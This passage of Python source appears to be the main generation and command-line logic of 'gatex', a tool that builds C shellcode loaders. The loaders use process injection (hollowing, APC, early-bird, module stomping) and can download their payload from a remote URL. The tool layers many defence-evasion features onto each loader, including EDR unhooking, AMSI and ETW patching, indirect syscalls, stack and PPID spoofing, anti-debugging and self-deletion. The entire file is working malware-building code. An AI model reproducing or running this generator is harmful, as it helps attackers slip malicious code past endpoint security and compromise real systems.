        calls.append("    %s();\n" % th_fn)
    if getattr(args, 'wipe_pe', False):
        wp_fn, wp_code = gen_pe_header_wipe(resolve_fn)
        code_parts.append(wp_code + "\n\n")
        calls.append("    %s();\n" % wp_fn)
    if getattr(args, 'knowndlls', False):
        kd2_fn, kd2_code = gen_knowndlls_unhook(resolve_fn)
        code_parts.append(kd2_code + "\n\n")
        calls.append("    %s();\n" % kd2_fn)
    if getattr(args, 'retaddr_spoof', False):
        ra_setup, ra_code, ra_begin, ra_end = gen_return_addr_spoof(resolve_fn)
        code_parts.append(ra_code + "\n\n")
        calls.append("    %s();\n" % ra_setup)
    return "".join(code_parts), "".join(calls), ra_begin, ra_end

def _build_entry(body, sleep_call, use_sleep, fmt, resolve_fn=""):
    if fmt == "dll":
        tf = rand_id()
        ht = rand_id()
        hm = rand_id(6)
        reason = rand_id(6)
        lp = rand_id(6)
        param = rand_id(4)
        if use_sleep:
            thread = "DWORD WINAPI %s(LPVOID %s) {\n%s\n%s\n    return 0;\n}" % (tf, param, body, sleep_call)
        else:
            thread = "DWORD WINAPI %s(LPVOID %s) {\n%s\n    return 0;\n}" % (tf, param, body)
        ptr_ct, r_ct = gen_resolve_one(resolve_fn, 'CreateThread')
        ptr_ch, r_ch = gen_resolve_one(resolve_fn, 'CloseHandle')
        ptr_dtlc, r_dtlc = gen_resolve_one(resolve_fn, 'DisableThreadLibraryCalls')
        dll_main = "BOOL APIENTRY DllMain(HMODULE %s, DWORD %s, LPVOID %s) {\n" % (hm, reason, lp)
        dll_main += "    if (%s == DLL_PROCESS_ATTACH) {\n" % reason
        dll_main += r_dtlc + "\n" + r_ct + "\n" + r_ch + "\n"
        dll_main += "        if (%s) %s(%s);\n" % (ptr_dtlc, ptr_dtlc, hm)
        dll_main += "        HANDLE %s = %s ? %s(NULL, 0, %s, NULL, 0, NULL) : NULL;\n" % (ht, ptr_ct, ptr_ct, tf)
        dll_main += "        if (%s && %s) %s(%s);\n" % (ht, ptr_ch, ptr_ch, ht)
        dll_main += "    }\n    return TRUE;\n}"
        return thread + "\n\n" + dll_main
    else:
        if use_sleep:
            return "int main() {\n%s\n%s\n    return 0;\n}" % (body, sleep_call)
        else:
            return "int main() {\n%s\n    return 0;\n}" % body

def _build_decrypt_call(dec_fn, sc_var, key_var, iv_var, use_aes, compound_dec_fn, ck_var, staging_fn=None):
    if staging_fn:
        dl_len = rand_id()
        dl_buf = rand_id()
        call = "    unsigned int %s = 0;\n    unsigned char* %s = %s(&%s);\n    if (!%s || %s == 0) return 1;" % (
            dl_len, dl_buf, staging_fn, dl_len, dl_buf, dl_len)
        if compound_dec_fn:
            call += "\n    %s(%s, %s, %s, %s_len);" % (compound_dec_fn, dl_buf, dl_len, ck_var, ck_var)
        if use_aes:
            out_len = rand_id()
            out_ptr = rand_id()
            call += "\n    unsigned int %s = 0;\n    unsigned char* %s = %s(%s, %s, %s, %s, &%s);\n    if (!%s) return 1;" % (
                out_len, out_ptr, dec_fn, dl_buf, dl_len, key_var, iv_var, out_len, out_ptr)
            return call, out_ptr, out_len
        else:
            call += "\n    %s(%s, %s, %s, %s_len);" % (dec_fn, dl_buf, dl_len, key_var, key_var)
            return call, dl_buf, dl_len
    else:
        compound_call = ""
        if compound_dec_fn:
            compound_call = "    %s(%s, %s_len, %s, %s_len);" % (compound_dec_fn, sc_var, sc_var, ck_var, ck_var)
        if use_aes:
            out_len = rand_id()
            out_ptr = rand_id()
            aes_call = "    unsigned int %s = 0;\n    unsigned char* %s = %s(%s, %s_len, %s, %s, &%s);\n    if (!%s) return 1;" % (
                out_len, out_ptr, dec_fn, sc_var, sc_var, key_var, iv_var, out_len, out_ptr)
            call = compound_call + ("\n" if compound_call else "") + aes_call
            return call, out_ptr, out_len
        else:
            primary_call = "    %s(%s, %s_len, %s, %s_len);" % (dec_fn, sc_var, sc_var, key_var, key_var)
            call = compound_call + ("\n" if compound_call else "") + primary_call
            return call, sc_var, "%s_len" % sc_var

def generate(args):
    global _hash_seed
    _hash_seed = random.randint(100000, 0x7FFFFFFF)

    shellcode = _validate_input(args)

    if args.stealth:
        args.sandbox = True
        args.unhook = True
        args.patch_etw = True
        args.patch_amsi = True
        args.syscalls = True
        args.sleep_obf = True
        args.anti_debug = True
        args.hwbp = True
        args.cfg = True
        args.spoof_stack = True
        args.anti_emulation = True
        args.thread_hide = True
        args.wipe_pe = True
        args.heap_encrypt = True
        args.cff = True
        args.knowndlls = True
        args.retaddr_spoof = True
        args.anti_disasm = True
        args.fluctuate = True
        args.hmac = True
        args.multistage = True
        if args.format == "exe":
            args.self_delete = True
        if args.technique in ("apc", "earlybird", "hollow"):
            args.ppid_spoof = True
            args.cmdline_spoof = True

    info = TECHNIQUE_INFO[args.technique]
    junk = not args.no_junk
    use_syscalls = args.syscalls
    use_sleep_obf = args.sleep_obf and args.technique in LOCAL_TECHNIQUES
    use_ppid_spoof = args.ppid_spoof and args.technique in ("apc", "earlybird", "hollow")
    use_self_delete = args.self_delete and args.format == "exe"
    use_staged = bool(args.staged)

    if args.sleep_obf and args.technique not in LOCAL_TECHNIQUES:
        print("[*] Sleep obfuscation only applies to local/stomp techniques, skipping")
    if args.ppid_spoof and args.technique not in ("apc", "earlybird", "hollow"):
        print("[*] PPID spoofing only applies to process-creating techniques (apc, earlybird, hollow), skipping")
    if args.self_delete and args.format == "dll":
        print("[*] Self-delete not applicable for DLL format, skipping")

    env_hash = None
    if args.env_keying:
        env_hash = hashlib.sha256(args.env_keying.lower().encode()).digest()

    resolve_fn, hash_fn, resolve_code = gen_resolve_api_fn()

    exit_fn, exit_code = gen_safe_exit(resolve_fn)
    sleep_fn, sleep_code = gen_safe_sleep(resolve_fn)

    encrypted, stored_key, iv_bytes, dec_fn, dec_code, use_aes, \
        compound_key, compound_dec_fn, compound_dec_code = _encrypt_shellcode(shellcode, args, env_hash)

    sc_var = rand_id()
    key_var = rand_id()
    iv_var = rand_id()
    ck_var = rand_id()

    use_heap_enc = getattr(args, 'heap_encrypt', False) and not use_staged
    heap_enc_fn = ""
    heap_enc_code = ""
    heap_enc_call = ""
    if use_heap_enc:
        heap_enc_fn, heap_enc_body, heap_key = gen_heap_encrypt(resolve_fn)
        heap_enc_code = heap_enc_body + "\n\n"
        heap_enc_call = "    %s(%s, sizeof(%s));\n" % (heap_enc_fn, sc_var, sc_var)
        encrypted = bytes(b ^ heap_key[i % 16] for i, b in enumerate(encrypted))

    use_hmac = getattr(args, 'hmac', False) and not use_staged
    hmac_fn = ""
    hmac_code = ""
    hmac_call = ""

    use_multistage = getattr(args, 'multistage', False) and not use_staged
    ms_layers = []
    if use_multistage:
        for _ in range(2):
            mk = secrets.token_bytes(32)
            encrypted = xor_bytes(encrypted, mk)
            ms_dec_fn, ms_dec_code = gen_xor_decrypt()
            ms_layers.append((mk, ms_dec_fn, ms_dec_code))
        ms_layers.reverse()

    if use_hmac:
        hmac_key = secrets.token_bytes(32)
        hmac_fn, hmac_body, _ = gen_hmac_verify(hmac_key, encrypted)
        hmac_code = hmac_body + "\n"
        hmac_call = "    if (!%s(%s, sizeof(%s))) return 1;\n" % (hmac_fn, sc_var, sc_var)

    if use_staged:
        staging_fn, staging_code = gen_staging(resolve_fn, args.staged)
        payload_path = os.path.join(args.output_dir, "payload.enc")
        os.makedirs(args.output_dir, exist_ok=True)
        fd_p = os.open(payload_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd_p, "wb") as f:
            f.write(encrypted)
        arr_parts = [to_c_array(stored_key, key_var)]
        if iv_bytes:
            arr_parts.append(to_c_array(iv_bytes, iv_var))
        if compound_key:
            arr_parts.append(to_c_array(compound_key, ck_var))
        for i, (mk, _, _) in enumerate(ms_layers):
            arr_parts.append(to_c_array(mk, "ms_k%d" % i))
        arrays = "\n\n".join(arr_parts)
    else:
        staging_fn = None
        staging_code = ""
        arr_parts = [to_c_array(encrypted, sc_var), to_c_array(stored_key, key_var)]
        if iv_bytes:
            arr_parts.append(to_c_array(iv_bytes, iv_var))
        if compound_key:
            arr_parts.append(to_c_array(compound_key, ck_var))
        for i, (mk, _, _) in enumerate(ms_layers):
            arr_parts.append(to_c_array(mk, "ms_k%d" % i))
        arrays = "\n\n".join(arr_parts)

    sc_map = None
    sc_infra_code = ""
    sc_init_call = ""
    if use_syscalls:
        sc_map, sc_init_fn, sc_infra_code = gen_syscall_infra(resolve_fn)
        sc_init_call = "    %s();\n" % sc_init_fn

    sleep_gb = None
    sleep_gs = None
    sleep_obf_code = ""
    sleep_globals_code = ""
    sleep_call = ""
    use_fluctuate = getattr(args, 'fluctuate', False) and args.technique in LOCAL_TECHNIQUES
    fluctuate_code = ""
    fluctuate_globals = ""
    if use_fluctuate:
        fl_fn, fl_gb, fl_gs, fluctuate_globals, fluctuate_code = gen_shellcode_fluctuate(resolve_fn, sc_map)
        sleep_gb = fl_gb
        sleep_gs = fl_gs
        sleep_globals_code = fluctuate_globals
        sleep_obf_code = fluctuate_code
        sleep_call = "    %s();" % fl_fn
    elif use_sleep_obf:
        use_spoof_stack = getattr(args, 'spoof_stack', False)
        sleep_obf_fn, sleep_gb, sleep_gs, sleep_globals_code, sleep_obf_code = gen_sleep_obf(
            resolve_fn, sc_map, spoof_stack=use_spoof_stack)
        sleep_call = "    %s();" % sleep_obf_fn

    env_key_code = ""
    env_key_call = ""
    if args.env_keying:
        ek_fn, ek_code = gen_env_keying(resolve_fn, hash_fn, key_var, exit_fn)
        env_key_code = ek_code + "\n\n"
        env_key_call = "    %s();\n" % ek_fn

    self_del_code = ""
    self_del_call = ""
    if use_self_delete:
        sd_fn, sd_code = gen_self_delete(resolve_fn)
        self_del_code = sd_code + "\n\n"
        self_del_call = "    %s();\n" % sd_fn

    find_fn = ""
    pid_code = ""
    needs_find_pid = info['needs_pid'] or use_ppid_spoof
    if needs_find_pid:
        find_fn, pid_str = gen_find_pid(resolve_fn)
        pid_code = pid_str + "\n\n"

    use_cfg = getattr(args, 'cfg', False) and info['local']
    cfg_fn_name = ""
    cfg_code = ""
    if use_cfg:
        cfg_fn_name, cfg_body = gen_cfg_guard(resolve_fn)
        cfg_code = cfg_body + "\n\n"

    use_cmdline_spoof = getattr(args, 'cmdline_spoof', False) and args.technique in ("apc", "earlybird", "hollow")
    cmdline_spoof_fn = ""
    cmdline_spoof_code = ""
    if use_cmdline_spoof:
        cmdline_spoof_fn, cmdline_spoof_body = gen_cmdline_spoof(resolve_fn)
        cmdline_spoof_code = cmdline_spoof_body + "\n\n"

    tech_kwargs: Dict[str, object] = dict(resolve_fn=resolve_fn, junk=junk, syscall_map=sc_map,
                                          sleep_base=sleep_gb, sleep_size=sleep_gs)
    if args.technique in ("apc", "earlybird", "hollow"):
        tech_kwargs['ppid_spoof'] = use_ppid_spoof
        tech_kwargs['find_pid_fn'] = find_fn
        if use_cmdline_spoof:
            tech_kwargs['cmdline_spoof_fn'] = cmdline_spoof_fn
    if args.technique == "stomp":
        tech_kwargs['stomp_dll'] = args.stomp_dll
    if use_cfg:
        tech_kwargs['cfg_fn'] = cfg_fn_name
    tech_fn, tech_code = TECH_GEN[args.technique](**tech_kwargs)

    evasion_code, evasion_calls, ra_begin, ra_end = _build_evasion(resolve_fn, args, sc_map, exit_fn, sleep_fn)
    includes = _build_includes(args, use_aes, use_ppid_spoof)

    target_proc = args.target or "explorer.exe"
    target_path = "C:\\\\Windows\\\\System32\\\\%s" % (args.target or "svchost.exe")

    decrypt_call, sc_ref, sl_ref = _build_decrypt_call(
        dec_fn, sc_var, key_var, iv_var, use_aes,
        compound_dec_fn if args.compound else None, ck_var,
        staging_fn if use_staged else None)

    if info['local'] or args.technique == 'earlybird':
        tech_call = "    %s(%s, %s);" % (tech_fn, sc_ref, sl_ref)
    elif info['needs_pid']:
        pv = rand_id()
        tgt_var = rand_id(8)
        tgt_str = c_stack_string(target_proc, tgt_var)
        tech_call = "%s\n    DWORD %s = %s(%s);\n    if (!%s) return 1;\n    %s(%s, %s, %s);" % (
            tgt_str, pv, find_fn, tgt_var, pv, tech_fn, sc_ref, sl_ref, pv)
    elif info['needs_path']:
        tgt_var = rand_id(8)
        tgt_str = c_stack_string(target_path, tgt_var)
        tech_call = "%s\n    %s(%s, %s, %s);" % (tgt_str, tech_fn, sc_ref, sl_ref, tgt_var)

    main_junk1 = gen_junk_block() + "\n" if junk else ""
    main_junk2 = gen_junk_block() + "\n" if junk else ""
    use_cff = getattr(args, 'cff', False)
    if use_cff and evasion_calls.strip():
        ev_list = [c for c in evasion_calls.strip().split("\n") if c.strip()]
        flat_evasion = gen_cff_dispatch(ev_list)
    else:
        flat_evasion = evasion_calls

    anti_disasm_block = ""
    if getattr(args, 'anti_disasm', False):
        anti_disasm_block = gen_anti_disasm() + "\n"

    ms_decrypt_calls = ""
    if use_multistage:
        for i, (_, ms_dec_fn, _) in enumerate(ms_layers):
            ms_decrypt_calls += "    %s(%s, %s_len, ms_k%d, ms_k%d_len);\n" % (ms_dec_fn, sc_var, sc_var, i, i)

    hmac_block = ""
    if use_hmac:
        hmac_block = hmac_call

    body = "%s%s%s%s%s%s%s%s%s\n%s%s%s" % (
        flat_evasion, sc_init_call, env_key_call, anti_disasm_block, main_junk1,
        hmac_block, heap_enc_call, ms_decrypt_calls, decrypt_call, main_junk2, tech_call,
        "\n" + self_del_call if self_del_call else "")
    if ra_begin and ra_end:
        ra_sv = rand_id(6)
        body = "    void* %s = %s();\n%s    %s(%s);\n" % (ra_sv, ra_begin, body, ra_end, ra_sv)
    main_block = _build_entry(body, sleep_call, use_sleep_obf or use_fluctuate, args.format, resolve_fn)

    safe_helpers = exit_code + "\n\n" + sleep_code + "\n\n"
    helper_code = safe_helpers + evasion_code + env_key_code + self_del_code + pid_code
    if cfg_code:
        helper_code += cfg_code
    if heap_enc_code:
        helper_code += heap_enc_code
    if hmac_code:
        helper_code += hmac_code + "\n\n"
    if cmdline_spoof_code:
        helper_code += cmdline_spoof_code
    if staging_code:
        helper_code += staging_code + "\n\n"
    if sleep_obf_code:
        helper_code += sleep_obf_code + "\n\n"
    helper_code += tech_code

    dec_sections = [dec_code]
    if compound_dec_code:
        dec_sections.append(compound_dec_code)
    for _, ms_dec_fn, ms_dec_code in ms_layers:
        dec_sections.append(ms_dec_code)
    dec_combined = "\n\n".join(dec_sections)

    sections = [includes, resolve_code]
    if sc_infra_code:
        sections.append(sc_infra_code)
    decoy_g = gen_decoy_globals()
    decoy_fns = "\n\n".join(gen_decoy_function() for _ in range(random.randint(2, 5)))
    sections.append(decoy_g)
    if sleep_globals_code:
        sections.append(sleep_globals_code)
    sections.extend([arrays, dec_combined, decoy_fns, helper_code, main_block])
    full = "\n\n".join(s.strip() for s in sections if s.strip()) + "\n"

    os.makedirs(args.output_dir, exist_ok=True)
    out_name = args.output
    if not out_name.endswith(".c"):
        out_name += ".c"
    out_path = os.path.join(args.output_dir, out_name)
    if os.path.exists(out_path):
        print("[*] Overwriting existing file: %s" % out_path)
    fd = os.open(out_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        f.write(full)

    sha_hash = hashlib.sha256(full.encode()).hexdigest()

    features = ["PEB walk API resolution"]
    if junk: features.append("junk code")
    if args.anti_debug: features.append("anti-debug (6 checks)")
    if args.patch_etw:
        if getattr(args, 'hwbp', False):
            features.append("ETW bypass (hardware breakpoint)")
        else:
            features.append("ETW patch (polymorphic)")
    if args.patch_amsi:
        if getattr(args, 'hwbp', False):
            features.append("AMSI bypass (hardware breakpoint)")
        else:
            features.append("AMSI bypass (polymorphic)")
    if args.unhook: features.append("ntdll unhook")
    if use_syscalls: features.append("indirect syscalls")
    if use_sleep_obf:
        if getattr(args, 'spoof_stack', False):
            features.append("sleep obfuscation (stack encryption)")
        else:
            features.append("sleep obfuscation")
    if use_ppid_spoof: features.append("PPID spoofing")
    if use_cfg: features.append("CFG bypass")
    if args.guardrails: features.append("guardrails (%s)" % args.guardrails)
    if args.env_keying: features.append("env-keying (%s)" % args.env_keying)
    if args.kill_date: features.append("kill-date (%s)" % args.kill_date)
    if use_self_delete: features.append("self-delete")
    if use_staged: features.append("staged (%s)" % args.staged)
    if args.compound: features.append("compound encryption")
    if getattr(args, 'anti_emulation', False): features.append("anti-emulation")
    if getattr(args, 'thread_hide', False): features.append("thread-hide")
    if getattr(args, 'wipe_pe', False): features.append("PE header wipe")
    if getattr(args, 'heap_encrypt', False) and not use_staged: features.append("heap encryption")
    if getattr(args, 'cff', False): features.append("control flow flattening")
    if args.technique == "stomp" and args.stomp_dll != "xpsservices.dll":
        features.append("custom stomp (%s)" % args.stomp_dll)
    if getattr(args, 'knowndlls', False): features.append("KnownDlls unhook")
    if getattr(args, 'retaddr_spoof', False): features.append("return address spoofing")
    if use_cmdline_spoof: features.append("command line spoofing")
    if getattr(args, 'anti_disasm', False): features.append("anti-disassembly")
    if use_fluctuate: features.append("shellcode fluctuation (PAGE_NOACCESS)")
    if use_hmac: features.append("HMAC-SHA256 signing")
    if use_multistage: features.append("multi-stage polymorphism (%d layers)" % len(ms_layers))

    enc_label = args.encrypt.upper()
    if args.compound:
        enc_label = "XOR+%s (compound)" % enc_label

    print("[+] Loader generated: %s" % out_path)
    print("    Shellcode:  %d bytes" % len(shellcode))
    print("    Encrypted:  %d bytes (%s)" % (len(encrypted), enc_label))
    print("    Technique:  %s" % args.technique)
    print("    Format:     %s" % args.format.upper())
    print("    Sandbox:    %s" % ("enabled (15 checks)" if args.sandbox else "disabled"))
    print("    Evasion:    %s (%d features)" % (", ".join(features), len(features)))
    print("    Variables:  randomized (polymorphic)")
    print("    Hash seed:  0x%08x (unique per generation)" % _hash_seed)
    print("    Integrity:  sha256:%s" % sha_hash)
    if info['needs_pid']:
        print("    Target:     %s" % target_proc)
    elif info['needs_path']:
        print("    Target:     %s" % target_path)
    if use_staged:
        payload_path = os.path.join(args.output_dir, "payload.enc")
        print("    Payload:    %s (%d bytes)" % (payload_path, len(encrypted)))
        print("    [!] Host payload.enc at: %s" % args.staged)
    print()
    needs_bcrypt = use_aes or use_hmac or bool(args.env_keying)
    lib_flag = " bcrypt.lib" if needs_bcrypt else ""
    if args.format == "dll":
        print("    Compile (MSVC):  cl /LD /O2 %s /link%s" % (args.output, lib_flag))
        gcc_flag = " -lbcrypt" if needs_bcrypt else ""
        print("    Compile (MinGW): x86_64-w64-mingw32-gcc -shared -O2 %s -o loader.dll%s" % (args.output, gcc_flag))
    else:
        print("    Compile (MSVC):  cl /O2 %s /link%s" % (args.output, lib_flag))
        gcc_flag = " -lbcrypt" if needs_bcrypt else ""
        print("    Compile (MinGW): x86_64-w64-mingw32-gcc -O2 %s -o loader.exe%s" % (args.output, gcc_flag))

def main():
    epilog = """examples:
  %(prog)s payload.bin -t local -e aes
  %(prog)s payload.bin -t hollow --stealth --compound
  %(prog)s payload.bin -t apc --staged http://10.0.0.1/p.enc --env-keying DC01
  %(prog)s payload.bin -t inject --syscalls --anti-debug --kill-date 2027-12-31"""
    p = argparse.ArgumentParser(
        prog="gatex",
        description="polymorphic shellcode loader generator",
        epilog=epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("input", nargs="?", help="Raw shellcode file (.bin)")
    p.add_argument("--version", action="version", version="gatex %s" % VERSION)
    p.add_argument("-t", "--technique", choices=TECHNIQUES, default="local",
                   help="Injection technique (default: local)")
    p.add_argument("-e", "--encrypt", choices=["xor", "aes", "rc4"], default="xor",
                   help="Encryption (default: xor)")
    p.add_argument("-s", "--sandbox", action="store_true",
                   help="Add sandbox evasion (15 checks)")
    p.add_argument("--target", help="Target process for inject/hijack/apc/hollow (default: explorer.exe)")
    p.add_argument("-o", "--output", default="loader.c",
                   help="Output filename (default: loader.c)")
    p.add_argument("--output-dir", default=None,
                   help="Output directory (default: ./output)")
    p.add_argument("--unhook", action="store_true",
                   help="Add ntdll unhooking (removes EDR hooks)")
    p.add_argument("--patch-etw", action="store_true",
                   help="Patch EtwEventWrite (blind ETW tracing)")
    p.add_argument("--patch-amsi", action="store_true",
                   help="Patch AmsiScanBuffer (bypass AMSI scanning)")
    p.add_argument("--syscalls", action="store_true",
                   help="Use indirect syscalls (bypass ntdll hooks)")
    p.add_argument("--sleep-obf", action="store_true",
                   help="Add sleep obfuscation (encrypt shellcode during sleep)")
    p.add_argument("--no-junk", action="store_true",
                   help="Disable junk code insertion")
    p.add_argument("--stealth", action="store_true",
                   help="Enable all evasion features")
    p.add_argument("--format", choices=["exe", "dll"], default="exe",
                   help="Output format (default: exe)")
    p.add_argument("--ppid-spoof", action="store_true",
                   help="Spoof parent PID via explorer.exe (APC technique only)")
    p.add_argument("--guardrails", metavar="DOMAIN",
                   help="Only execute in specified domain (e.g. CORP.EXAMPLE.COM)")
    p.add_argument("--anti-debug", action="store_true",
                   help="Anti-debug: PEB, NtGlobalFlag, DebugPort, DebugObject, HW breakpoints, timing")
    p.add_argument("--kill-date", metavar="YYYY-MM-DD",
                   help="Payload expires after this date (local time)")
    p.add_argument("--env-keying", metavar="HOSTNAME",
                   help="Bind decryption key to target hostname (shellcode only works on that machine)")
    p.add_argument("--staged", metavar="URL",
                   help="Remote staging: download encrypted shellcode from URL at runtime (zero on-disk)")
    p.add_argument("--self-delete", action="store_true",
                   help="Delete executable from disk after execution (EXE only)")
    p.add_argument("--compound", action="store_true",
                   help="Double-layer encryption (XOR wrap over primary cipher)")
    p.add_argument("--stomp-dll", metavar="DLL", default="xpsservices.dll",
                   help="Target DLL for module stomping (default: xpsservices.dll)")
    p.add_argument("--hwbp", action="store_true",
                   help="Use hardware breakpoints for AMSI/ETW bypass (no memory patching)")
    p.add_argument("--cfg", action="store_true",
                   help="Add CFG bypass (mark shellcode as valid indirect call target)")
    p.add_argument("--spoof-stack", action="store_true",
                   help="Encrypt call stack frames during sleep (Ekko-style stack spoofing)")
    p.add_argument("--anti-emulation", action="store_true",
                   help="Anti-emulation checks (CPUID, RDTSC, timing)")
    p.add_argument("--thread-hide", action="store_true",
                   help="Hide main thread from debuggers (NtSetInformationThread)")
    p.add_argument("--wipe-pe", action="store_true",
                   help="Wipe PE headers from process memory")
    p.add_argument("--heap-encrypt", action="store_true",
                   help="Double-XOR shellcode array at rest in memory")
    p.add_argument("--cff", action="store_true",
                   help="Control flow flattening for evasion dispatch (switch-based state machine)")
    p.add_argument("--knowndlls", action="store_true",
                   help="Unhook ntdll via \\KnownDlls\\ section mapping (no disk I/O)")
    p.add_argument("--retaddr-spoof", action="store_true",
                   help="Return address spoofing (find JMP gadget in ntdll for fake call frames)")
    p.add_argument("--anti-disasm", action="store_true",
                   help="Insert anti-disassembly tricks (overlapping instructions, fake jumps)")
    p.add_argument("--fluctuate", action="store_true",
                   help="Shellcode fluctuation: PAGE_NOACCESS + XOR during sleep (enhanced sleep-obf)")
    p.add_argument("--cmdline-spoof", action="store_true",
                   help="Command line spoofing: create process with fake args, wipe PEB after creation")
    p.add_argument("--hmac", action="store_true",
                   help="HMAC-SHA256 payload signing (verify integrity before execution)")
    p.add_argument("--multistage", action="store_true",
                   help="Multi-stage polymorphism (nested decryption layers)")
    p.add_argument("--list-techniques", action="store_true",
                   help="List available injection techniques and exit")
    args = p.parse_args()

    if args.list_techniques:
        print("Available injection techniques:\n")
        for t in TECHNIQUES:
            info = TECHNIQUE_INFO[t]
            scope = "local" if info['local'] else "remote"
            print("  %-10s [%-6s] %s" % (t, scope, TECHNIQUE_DESC[t]))
        print()
        sys.exit(0)

    if not args.input:
        p.error("the following arguments are required: input")

    if args.output_dir is None:
        args.output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")

    if not hasattr(args, 'ppid_spoof'):
        args.ppid_spoof = False
    if not hasattr(args, 'anti_debug'):
        args.anti_debug = False
    if not hasattr(args, 'self_delete'):
        args.self_delete = False
    if not hasattr(args, 'hwbp'):
        args.hwbp = False
    if not hasattr(args, 'cfg'):
        args.cfg = False
    if not hasattr(args, 'spoof_stack'):
        args.spoof_stack = False
    if not hasattr(args, 'anti_emulation'):
        args.anti_emulation = False
    if not hasattr(args, 'thread_hide'):
        args.thread_hide = False
    if not hasattr(args, 'wipe_pe'):
        args.wipe_pe = False
    if not hasattr(args, 'heap_encrypt'):
        args.heap_encrypt = False
    if not hasattr(args, 'knowndlls'):
        args.knowndlls = False
    if not hasattr(args, 'retaddr_spoof'):
        args.retaddr_spoof = False
    if not hasattr(args, 'anti_disasm'):
        args.anti_disasm = False
    if not hasattr(args, 'fluctuate'):
        args.fluctuate = False
    if not hasattr(args, 'cmdline_spoof'):
        args.cmdline_spoof = False
    if not hasattr(args, 'hmac'):
        args.hmac = False
    if not hasattr(args, 'multistage'):
        args.multistage = False

    if args.kill_date:
        try:
            parts = args.kill_date.split("-")
            if len(parts) != 3:
                raise ValueError
            y, m, d = int(parts[0]), int(parts[1]), int(parts[2])
            if not (2000 <= y <= 2100 and 1 <= m <= 12 and 1 <= d <= 31):
                raise ValueError
        except (ValueError, IndexError):
            print("[!] Invalid kill-date format. Use YYYY-MM-DD (e.g. 2027-12-31)")
            sys.exit(1)

    generate(args)

if __name__ == "__main__":
    main()
